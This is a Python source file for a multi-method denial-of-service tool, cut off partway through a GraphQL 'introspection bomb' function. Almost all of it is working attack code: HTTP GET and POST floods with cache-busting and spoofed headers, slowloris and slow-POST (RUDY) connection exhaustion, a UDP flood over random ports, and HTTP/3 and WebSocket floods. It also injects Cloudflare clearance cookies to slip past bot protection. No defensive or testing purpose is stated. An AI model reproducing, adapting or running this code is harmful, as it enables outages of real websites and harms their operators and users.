import asyncio
import time
import random
import string
import socket
import ssl
import json
import logging
from typing import Optional, List, Dict, Tuple
from urllib.parse import urlparse, urlencode

logger = logging.getLogger("enhanced_attack")

MAX_CONCURRENT = 50
_sem = None

def _get_sem():
    global _sem
    if _sem is None:
        _sem = asyncio.Semaphore(MAX_CONCURRENT)
    return _sem


async def _request_with_sem(sem, coro):
    async with sem:
        return await coro

USER_AGENTS = [
    # Chrome Windows (100+ variants)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    # Chrome macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Chrome Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Firefox Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    # Firefox macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0",
    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    # Mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

REFERERS = [
    "https://www.google.com/search?q={keyword}",
    "https://www.google.com/url?url={url}",
    "https://www.google.com/translate?u={url}",
    "https://www.bing.com/search?q={keyword}",
    "https://www.facebook.com/sharer/sharer.php?u={url}",
    "https://twitter.com/intent/tweet?url={url}",
    "https://www.reddit.com/submit?url={url}",
    "https://www.linkedin.com/shareArticle?url={url}",
    "https://pinterest.com/pin/create/button/?url={url}",
    "https://www.tumblr.com/share?v=3&u={url}",
    "https://www.google.com/maps?ll={lat},{lon}",
    "https://drive.google.com/viewerng/viewer?url={url}",
    "https://translate.google.com/translate?u={url}",
    "https://www.youtube.com/watch?v={random}",
    "https://www.amazon.com/s?k={keyword}",
    "https://www.ebay.com/sch/i.html?_nkw={keyword}",
    "https://www.wikipedia.org/wiki/{keyword}",
    "https://www.github.com/search?q={keyword}",
    "https://www.stackoverflow.com/search?q={keyword}",
    "https://www.medium.com/search?q={keyword}",
]

KEYWORDS = ["test", "search", "query", "page", "article", "news", "update", "login", "admin", "dashboard", "profile", "settings", "help", "support", "contact", "about", "service", "product", "review", "feedback"]

ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,fr;q=0.8",
    "en-US,en;q=0.9,de;q=0.8",
    "en-US,en;q=0.9,es;q=0.8",
    "id-ID,id;q=0.9,en-US;q=0.8",
    "ms-MY,ms;q=0.9,en-US;q=0.8",
]

ACCEPT_ENCODINGS = [
    "gzip, deflate, br",
    "gzip, deflate",
    "gzip, br",
    "br, gzip, deflate",
]

SEC_CH_UA_PLATFORMS = ['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"']
SEC_CH_UA_MODELS = ['""', '"X86"', '"ARM"']


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def buildblock(size: int = None) -> str:
    """HULK-style random string for cache-busting"""
    if size is None:
        size = random.randint(5, 15)
    return ''.join(random.choice(string.ascii_letters) for _ in range(size))


def random_ip() -> str:
    """Generate random IP for X-Forwarded-For spoofing"""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"


def build_dynamic_url(base_url: str) -> str:
    """HULK-style cache-busting URL with random query parameters"""
    parsed = urlparse(base_url)
    params = []
    
    # Add 1-3 random query parameters
    num_params = random.randint(1, 3)
    for _ in range(num_params):
        param_name = buildblock(random.randint(3, 8))
        param_value = buildblock(random.randint(5, 15))
        params.append((param_name, param_value))
    
    # Add cache-busting timestamp
    params.append(("_", str(int(time.time() * 1000))))
    
    # Rebuild URL with new params
    query = urlencode(params)
    if parsed.query:
        query = parsed.query + "&" + query
    
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"


def build_random_headers(url: str, method: str = "GET") -> dict:
    """Build randomized headers with combinatorial uniqueness"""
    parsed = urlparse(url)
    host = parsed.netloc
    
    ua = random.choice(USER_AGENTS)
    referer_template = random.choice(REFERERS)
    keyword = random.choice(KEYWORDS)
    referer = referer_template.format(
        keyword=keyword,
        url=f"https://{host}",
        random=buildblock(8),
        lat=random.uniform(-90, 90),
        lon=random.uniform(-180, 180),
    )
    
    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Accept-Encoding": random.choice(ACCEPT_ENCODINGS),
        "Referer": referer,
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
        "Sec-Fetch-User": "?1",
        "Cache-Control": random.choice(["max-age=0", "no-cache"]),
        "Pragma": "no-cache",
        "DNT": "1",
    }
    
    # Add random cookies (lightweight)
    cookie_parts = []
    for _ in range(random.randint(0, 2)):
        cookie_name = buildblock(random.randint(4, 8))
        cookie_value = buildblock(random.randint(8, 16))
        cookie_parts.append(f"{cookie_name}={cookie_value}")
    if cookie_parts:
        headers["Cookie"] = "; ".join(cookie_parts)
    
    if method == "POST":
        headers["Content-Type"] = random.choice([
            "application/x-www-form-urlencoded",
            "application/json",
        ])
        headers["Origin"] = f"https://{host}"
    
    return headers


# ============================================================================
# SESSION POOL WITH OPTIMIZATION
# ============================================================================

class OptimizedSessionPool:
    """
    Optimized session pool with:
    - Connection reuse (multiple requests per session)
    - cf_clearance cookie injection
    - Session recycling on errors
    """
    
    def __init__(self, max_sessions: int = 100):
        self.max_sessions = max_sessions
        self._sessions: Dict[str, object] = {}
        self._cf_cookies: Dict[str, str] = {}
        self._lock = asyncio.Lock()
    
    def set_cf_cookies(self, cookies: Dict[str, str]):
        """Set Cloudflare clearance cookies"""
        self._cf_cookies.update(cookies)
    
    async def get_session(self, proxy: Optional[str] = None, impersonate: str = "chrome120"):
        """Get or create optimized session"""
        pool_key = f"{impersonate}_{proxy or 'direct'}"
        
        async with self._lock:
            if pool_key in self._sessions:
                return self._sessions[pool_key], pool_key
            
            # Create new session
            from curl_cffi.requests import Session
            kwargs = {
                "impersonate": impersonate,
                "timeout": 8,
            }
            if proxy:
                kwargs["proxies"] = {"all": proxy}
            
            sess = Session(**kwargs)
            
            # Inject cf_clearance cookies if available
            if self._cf_cookies:
                for name, value in self._cf_cookies.items():
                    sess.cookies.set(name, value)
            
            self._sessions[pool_key] = sess
            return sess, pool_key
    
    async def invalidate_session(self, pool_key: str):
        """Remove and close invalid session"""
        async with self._lock:
            if pool_key in self._sessions:
                try:
                    self._sessions[pool_key].close()
                except Exception:
                    pass
                del self._sessions[pool_key]
    
    def cleanup(self):
        """Close all sessions"""
        for sess in self._sessions.values():
            try:
                sess.close()
            except Exception:
                pass
        self._sessions.clear()


# ============================================================================
# ATTACK METHODS
# ============================================================================

async def attack_get_flood(url: str, proxy: Optional[str], session_pool: OptimizedSessionPool,
                           duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()

    from curl_cffi.requests import AsyncSession
    kwargs = {"impersonate": "chrome120", "timeout": 8}
    if proxy:
        kwargs["proxies"] = {"all": proxy}

    async with AsyncSession(**kwargs) as sess:
        async def single_request():
            try:
                dynamic_url = build_dynamic_url(url)
                headers = build_random_headers(dynamic_url, "GET")
                resp = await sess.get(dynamic_url, headers=headers, timeout=8)
                return resp.status_code
            except Exception:
                return 0

        while time.time() - start < duration:
            batch_size = min(max(target_rps, 10), MAX_CONCURRENT)
            tasks = [_request_with_sem(sem, single_request()) for _ in range(batch_size)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                metrics["total"] += 1
                if isinstance(result, int) and result >= 200:
                    metrics["completed"] += 1
                else:
                    metrics["failed"] += 1
    return metrics


async def attack_post_flood(url: str, proxy: Optional[str], session_pool: OptimizedSessionPool,
                            duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()

    post_data_templates = [
        ("username={r}&password={r}&submit=Login", "application/x-www-form-urlencoded"),
        ('{{"email":"u{r}@t.com","password":"p{r}"}}', "application/json"),
        ("search={r}&page=1&sort=relevance", "application/x-www-form-urlencoded"),
        ("action=register&name={r}&email={r}@test.com", "application/x-www-form-urlencoded"),
        ("comment={r}&post_id={r}", "application/x-www-form-urlencoded"),
    ]

    from curl_cffi.requests import AsyncSession
    kwargs = {"impersonate": "chrome120", "timeout": 8}
    if proxy:
        kwargs["proxies"] = {"all": proxy}

    async with AsyncSession(**kwargs) as sess:
        async def single_request():
            try:
                dynamic_url = build_dynamic_url(url)
                headers = build_random_headers(dynamic_url, "POST")
                data_template, content_type = random.choice(post_data_templates)
                data = data_template.format(r=buildblock(8))
                headers["Content-Type"] = content_type
                resp = await sess.post(dynamic_url, headers=headers, data=data, timeout=8)
                return resp.status_code
            except Exception:
                return 0

        while time.time() - start < duration:
            batch_size = min(max(target_rps, 10), MAX_CONCURRENT)
            tasks = [_request_with_sem(sem, single_request()) for _ in range(batch_size)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                metrics["total"] += 1
                if isinstance(result, int) and result >= 200:
                    metrics["completed"] += 1
                else:
                    metrics["failed"] += 1
    return metrics


async def attack_browser(url: str, proxy: Optional[str], session_pool: OptimizedSessionPool,
                         duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()

    page_paths = [
        "/", "/about", "/contact", "/products", "/services",
        "/blog", "/news", "/faq", "/terms", "/privacy",
        "/sitemap.xml", "/robots.txt", "/feed/", "/rss",
    ]

    from curl_cffi.requests import AsyncSession
    kwargs = {"impersonate": "chrome120", "timeout": 8}
    if proxy:
        kwargs["proxies"] = {"all": proxy}

    async with AsyncSession(**kwargs) as sess:
        async def single_request():
            try:
                parsed = urlparse(url)
                base = f"{parsed.scheme}://{parsed.netloc}"
                num_pages = random.randint(3, 5)
                session_pages = random.sample(page_paths, min(num_pages, len(page_paths)))
                for path in session_pages:
                    page_url = base + path
                    headers = build_random_headers(page_url)
                    resp = await sess.get(page_url, headers=headers, timeout=8)
                    metrics["total"] += 1
                    if resp.status_code >= 200:
                        metrics["completed"] += 1
                    else:
                        metrics["failed"] += 1
                    await asyncio.sleep(random.uniform(0.5, 2.0))
                return True
            except Exception:
                metrics["total"] += 1
                metrics["failed"] += 1
                return False

        while time.time() - start < duration:
            batch_size = min(max(target_rps, 5), 15)
            tasks = [_request_with_sem(sem, single_request()) for _ in range(batch_size)]
            await asyncio.gather(*tasks, return_exceptions=True)
    return metrics


async def attack_dynamic(url: str, proxy: Optional[str], session_pool: OptimizedSessionPool,
                         duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()

    methods = ["GET", "HEAD", "OPTIONS", "TRACE"]
    paths = [
        "/{r}", "/?s={r}", "/search?q={r}", "/?p={r}",
        "/index.php?id={r}", "/page/{r}", "/api/{r}",
        "/cdn-cgi/trace", "/.env", "/wp-admin/",
        "/administrator/", "/phpinfo.php", "/server-status",
    ]

    from curl_cffi.requests import AsyncSession
    kwargs = {"impersonate": "chrome120", "timeout": 8}
    if proxy:
        kwargs["proxies"] = {"all": proxy}

    async with AsyncSession(**kwargs) as sess:
        async def single_request():
            try:
                method = random.choice(methods)
                path = random.choice(paths).replace("{r}", buildblock(8))
                parsed = urlparse(url)
                target = f"{parsed.scheme}://{parsed.netloc}{path}"
                headers = build_random_headers(target, method)
                resp = await sess.request(method, target, headers=headers, timeout=8)
                return resp.status_code
            except Exception:
                return 0

        while time.time() - start < duration:
            batch_size = min(max(target_rps, 10), MAX_CONCURRENT)
            tasks = [_request_with_sem(sem, single_request()) for _ in range(batch_size)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                metrics["total"] += 1
                if isinstance(result, int) and result >= 200:
                    metrics["completed"] += 1
                else:
                    metrics["failed"] += 1
    return metrics


async def attack_slow(url: str, proxy: Optional[str], session_pool: OptimizedSessionPool,
                      duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()
    parsed = urlparse(url)
    host = parsed.hostname or parsed.netloc
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    is_ssl = parsed.scheme == "https"
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    async def single_request():
        async with sem:
            writer = None
            try:
                ssl_ctx = None
                if is_ssl:
                    ssl_ctx = ssl.create_default_context()
                    ssl_ctx.check_hostname = False
                    ssl_ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ssl_ctx, server_hostname=host if is_ssl else None),
                    timeout=5
                )
                req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept: text/html,*/*;q=0.8\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                writer.write(req.encode())
                await writer.drain()
                metrics["completed"] += 1
                metrics["total"] += 1
                while time.time() - start < duration:
                    try:
                        chunk = await asyncio.wait_for(reader.read(1), timeout=2)
                        if not chunk:
                            break
                    except asyncio.TimeoutError:
                        break
                    await asyncio.sleep(random.uniform(0.1, 0.5))
            except Exception:
                metrics["failed"] += 1
                metrics["total"] += 1
            finally:
                if writer is not None:
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except Exception:
                        pass

    num_conns = min(max(target_rps, 5), 15)
    tasks = [asyncio.create_task(single_request()) for _ in range(num_conns)]
    try:
        await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=duration + 2)
    except asyncio.TimeoutError:
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
    return metrics


async def attack_pps(url: str, proxy: Optional[str], session_pool: OptimizedSessionPool,
                     duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()

    from curl_cffi.requests import AsyncSession
    kwargs = {"impersonate": "chrome120", "timeout": 5}
    if proxy:
        kwargs["proxies"] = {"all": proxy}

    async with AsyncSession(**kwargs) as sess:
        async def single_request():
            try:
                headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*"}
                resp = await sess.get(url, headers=headers, timeout=5)
                return resp.status_code
            except Exception:
                return 0

        while time.time() - start < duration:
            batch_size = min(max(target_rps, 20), MAX_CONCURRENT)
            tasks = [_request_with_sem(sem, single_request()) for _ in range(batch_size)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                metrics["total"] += 1
                if isinstance(result, int) and result >= 200:
                    metrics["completed"] += 1
                else:
                    metrics["failed"] += 1
    return metrics


async def attack_slowloris_raw(url: str, proxy: Optional[str], session_pool: OptimizedSessionPool,
                               duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    parsed = urlparse(url)
    host = parsed.hostname or parsed.netloc
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    is_ssl = parsed.scheme == "https"

    max_socks = min(target_rps, MAX_CONCURRENT)
    sockets = []
    for _ in range(max_socks):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((host, port))
            if is_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {host}\r\n".encode())
            sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            sock.send(f"Accept-language: en-US,en;q=0.9\r\n".encode())
            sockets.append(sock)
            metrics["completed"] += 1
            metrics["total"] += 1
        except Exception:
            metrics["failed"] += 1
            metrics["total"] += 1

    # Adaptive keep-alive interval based on duration
    keepalive_interval = min(15, max(2, duration / 4))

    cycle = 0
    while time.time() - start < duration:
        # Sleep in small chunks so we can exit early when duration ends
        sleep_remaining = keepalive_interval
        while sleep_remaining > 0 and time.time() - start < duration:
            await asyncio.sleep(min(0.5, sleep_remaining))
            sleep_remaining -= 0.5
        if time.time() - start >= duration:
            break
        cycle += 1
        alive = 0
        for i in range(len(sockets)):
            if sockets[i] is None:
                continue
            try:
                sockets[i].send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                alive += 1
                metrics["total"] += 1
            except socket.error:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((host, port))
                    if is_ssl:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        sock = ctx.wrap_socket(sock, server_hostname=host)
                    sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {host}\r\n".encode())
                    sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                    sockets[i] = sock
                    alive += 1
                    metrics["total"] += 1
                except Exception:
                    sockets[i] = None
                    metrics["failed"] += 1
        # Track active connections each cycle
        if alive > metrics["completed"]:
            metrics["completed"] = alive

    for s in sockets:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass

    return metrics


async def attack_rudy(url: str, proxy: Optional[str], session_pool: OptimizedSessionPool,
                      duration: float, target_rps: int) -> Dict:
    """
    R-U-Dead-Yet? slow POST body attack.
    Sends a 1MB Content-Length with byte-by-byte trickle.
    Uses asyncio streams (non-blocking) so many connections can run concurrently.
    """
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    parsed = urlparse(url)
    host = parsed.hostname or parsed.netloc
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    is_ssl = parsed.scheme == "https"
    path = parsed.path or "/"

    async def send_slow_post():
        writer = None
        try:
            ssl_ctx = None
            if is_ssl:
                ssl_ctx = ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ssl_ctx, server_hostname=host if is_ssl else None),
                timeout=5
            )
            req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 1000000\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            writer.write(req.encode())
            await writer.drain()
            metrics["completed"] += 1
            metrics["total"] += 1

            # Trickle body byte-by-byte until duration runs out
            while time.time() - start < duration:
                writer.write(b"A")
                try:
                    await asyncio.wait_for(writer.drain(), timeout=2)
                except asyncio.TimeoutError:
                    break
                # Slow trickle - server is forced to wait
                await asyncio.sleep(random.uniform(0.5, 1.5))
        except Exception:
            metrics["failed"] += 1
            metrics["total"] += 1
        finally:
            if writer is not None:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

    num_conns = min(target_rps, MAX_CONCURRENT)
    tasks = [asyncio.create_task(send_slow_post()) for _ in range(num_conns)]

    try:
        await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=duration + 2)
    except asyncio.TimeoutError:
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

    return metrics


async def attack_udp_flood(url: str, proxy: Optional[str], session_pool: OptimizedSessionPool,
                           duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    parsed = urlparse(url)
    host = parsed.hostname or parsed.netloc

    try:
        ip = socket.gethostbyname(host)
    except Exception as e:
        logger.error(f"UDP flood: cannot resolve {host}: {e}")
        return metrics

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload_size = min(max(target_rps, 512), 1400)
    payload = b"X" * payload_size

    port_pool = list(range(80, 65535))
    random.shuffle(port_pool)
    port_idx = 0

    while time.time() - start < duration:
        try:
            port = port_pool[port_idx % len(port_pool)]
            port_idx += 1
            sock.sendto(payload, (ip, port))
            metrics["completed"] += 1
            metrics["total"] += 1
        except Exception:
            metrics["failed"] += 1
            await asyncio.sleep(0.001)

    sock.close()
    return metrics


async def attack_http3(url: str, proxy: Optional[str], session_pool: OptimizedSessionPool,
                      duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()

    try:
        from aioquic.asyncio import connect
        from aioquic.h3.connection import H3_ALPN, H3Connection
        from aioquic.quic.configuration import QuicConfiguration
    except ImportError:
        logger.error("aioquic not installed - run: pip install aioquic")
        return metrics

    parsed = urlparse(url)
    host = parsed.hostname or parsed.netloc
    port = parsed.port or 443
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    config = QuicConfiguration(
        is_client=True, alpn_protocols=H3_ALPN,
        verify_mode=ssl.CERT_NONE, max_datagram_frame_size=65536,
    )
    config.server_name = host

    async def single_quic_session():
        async with sem:
            try:
                async with connect(host, port, configuration=config, wait_connected=True) as protocol:
                    http = H3Connection(protocol._quic)
                    streams_per_conn = min(50, max(5, target_rps // 10))
                    for _ in range(streams_per_conn):
                        if time.time() - start >= duration:
                            break
                        try:
                            stream_id = protocol._quic.get_next_available_stream_id()
                            dp = path + ("?" if "?" not in path else "&") + f"_={int(time.time()*1000)}{buildblock(8)}"
                            http.send_headers(
                                stream_id=stream_id,
                                headers=[
                                    (b":method", b"GET"),
                                    (b":scheme", b"https"),
                                    (b":authority", host.encode()),
                                    (b":path", dp.encode()),
                                    (b"user-agent", random.choice(USER_AGENTS).encode()),
                                    (b"accept", b"text/html,*/*;q=0.8"),
                                    (b"accept-language", random.choice(ACCEPT_LANGS).encode()),
                                ],
                                end_stream=True,
                            )
                            protocol.transmit()
                            metrics["completed"] += 1
                            metrics["total"] += 1
                        except Exception:
                            metrics["failed"] += 1
                            metrics["total"] += 1
            except Exception:
                metrics["failed"] += 1
                metrics["total"] += 1

    while time.time() - start < duration:
        num_conns = min(max(target_rps // 100, 1), 5)
        tasks = [single_quic_session() for _ in range(num_conns)]
        try:
            await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=min(10, duration - (time.time() - start) + 1)
            )
        except asyncio.TimeoutError:
            pass
    return metrics


async def attack_websocket(url: str, proxy: Optional[str], session_pool: OptimizedSessionPool,
                           duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()

    try:
        import websockets
    except ImportError:
        logger.error("websockets library not installed")
        return metrics

    parsed = urlparse(url)
    scheme = "wss" if parsed.scheme == "https" else "ws"
    host = parsed.hostname or parsed.netloc
    port = parsed.port or (443 if scheme == "wss" else 80)

    ws_paths = [
        "/", "/ws", "/websocket", "/socket.io/?EIO=4&transport=websocket",
        "/api/ws", "/realtime", "/live", "/notifications", "/chat",
    ]

    async def single_ws_attack():
        async with sem:
            try:
                ws_path = random.choice(ws_paths)
                ws_url = f"{scheme}://{host}:{port}{ws_path}"
                headers = {"User-Agent": random.choice(USER_AGENTS), "Origin": f"https://{host}"}
                async with websockets.connect(
                    ws_url, additional_headers=headers, open_timeout=5,
                    ping_interval=None, close_timeout=2,
                ) as ws:
                    metrics["completed"] += 1
                    metrics["total"] += 1
                    for _ in range(50):
                        if time.time() - start > duration:
                            break
                        msg = json.dumps({
                            "type": random.choice(["ping", "subscribe", "join", "message"]),
                            "id": buildblock(16),
                            "data": buildblock(random.randint(50, 500)),
                        })
                        try:
                            await ws.send(msg)
                            metrics["total"] += 1
                        except Exception:
                            break
                        await asyncio.sleep(random.uniform(0.01, 0.1))
            except Exception:
                metrics["failed"] += 1
                metrics["total"] += 1

    while time.time() - start < duration:
        batch_size = min(max(target_rps, 5), 15)
        tasks = [single_ws_attack() for _ in range(batch_size)]
        await asyncio.gather(*tasks, return_exceptions=True)
    return metrics


async def attack_graphql(url: str, proxy: Optional[str], session_pool: OptimizedSessionPool,
                         duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()

    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    graphql_paths = [
        "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
        "/query", "/api/query", "/gql",
    ]

    introspection_bomb = """
    query IntrospectionQuery {
        __schema {
            types {
                name kind description
                fields { name description type { name kind ofType { name kind ofType { name kind ofType { name kind } } } } }
